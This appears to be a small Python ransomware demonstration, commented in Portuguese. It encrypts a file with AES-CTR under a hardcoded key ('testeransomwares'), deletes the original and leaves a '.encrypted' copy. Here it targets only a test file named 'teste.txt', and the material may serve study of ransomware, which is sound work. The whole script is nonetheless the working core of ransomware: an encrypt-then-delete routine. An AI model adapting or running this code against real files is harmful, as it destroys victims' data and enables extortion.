import os
import pyaes

def encrypt_file(file_name, key):
    
    """
    Criptografa um arquivo usando a chave fornecida e remove o original.
    """
    # Ler o conteúdo do arquivo
    with open(file_name, "rb") as file:
        file_data = file.read()

    # Remover o arquivo original
    os.remove(file_name)

    # Criptografar os dados
    aes = pyaes.AESModeOfOperationCTR(key)
    crypto_data = aes.encrypt(file_data)

    # Salvar os dados criptografados em um novo arquivo
    encrypted_file_name = f"{file_name}.encrypted"
    with open(encrypted_file_name, "wb") as encrypted_file:
        encrypted_file.write(crypto_data)

    print(f"Arquivo '{file_name}' foi criptografado para '{encrypted_file_name}'.")

def main():
    # Nome do arquivo a ser criptografado
    file_name = "teste.txt"

    # Chave de criptografia
    key = b"testeransomwares"  # Deve ter 16, 24 ou 32 bytes

    # Verificar se o arquivo existe antes de prosseguir
    if not os.path.exists(file_name):
        print(f"Arquivo '{file_name}' não encontrado.")
        return

    # Criptografar o arquivo
    encrypt_file(file_name, key)

if __name__ == "__main__":
    main()
